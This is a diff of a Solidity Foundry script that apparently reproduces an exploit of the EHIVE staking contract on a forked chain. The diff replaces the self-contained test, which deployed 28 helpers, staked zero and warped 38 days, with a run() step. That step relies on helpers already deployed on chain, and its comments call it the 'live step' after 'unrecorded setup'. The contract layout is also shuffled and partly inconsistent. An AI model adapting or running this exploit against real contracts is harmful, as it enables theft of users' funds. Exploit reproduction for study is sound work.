@@ -1,5 +1,3 @@
-contract UnstakeContract {} 
-
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
@@ -53,6 +51,14 @@ contract ContractTest is Test {
     IUniswapV2Pair private constant EHIVE_WETH = IUniswapV2Pair(0xAE851769593AC6048D36BC123700649827659A82);
     address[28] public contractList;
 
+    constructor(
+        address[28] memory helpers
+    ) {
+        for (uint256 i; i < helpers.length; ++i) {
+            contractList[i] = helpers[i];
+        }
+    }
+
     function setUp() public {
         // Start from the block when exploit contracts were deployed
         vm.createSelectFork("http://127.0.0.1:8545", 17_690_497);
@@ -62,16 +68,10 @@ contract ContractTest is Test {
         vm.label(address(EHIVE_WETH), "EHIVE_WETH");
     }
 
-    function testExploit() public {
-        // 1. Deploy exploit contract
-        // 2. Call EHIVE stake function with amount 0
-        for (uint256 i; i < contractList.length; ++i) {
-            address deployedContract = address(new UnstakeContract());
-            IUnstake(deployedContract).stake(0);
-            contractList[i] = deployedContract;
-        }
-        // Jump to the time when attack was happen
-        vm.warp(block.timestamp + 38 days);
+    function run() public {
+        // The helper contracts were deployed and registered with stake(0) in
+        // unrecorded setup. The config rewinds their EHIVE start timestamps to
+        // mirror the real 38-day preparation window before this live step.
         emit log_named_decimal_uint(
             "Attacker WETH balance before attack", WETH.balanceOf(address(this)), WETH.decimals()
         );
@@ -124,7 +124,7 @@ contract ContractTest is Test {
     }
 }
 
-contract ContractTest is Test {
+contract UnstakeContract {
     IEHIVE private constant EHIVE = IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);
 
     function stake(
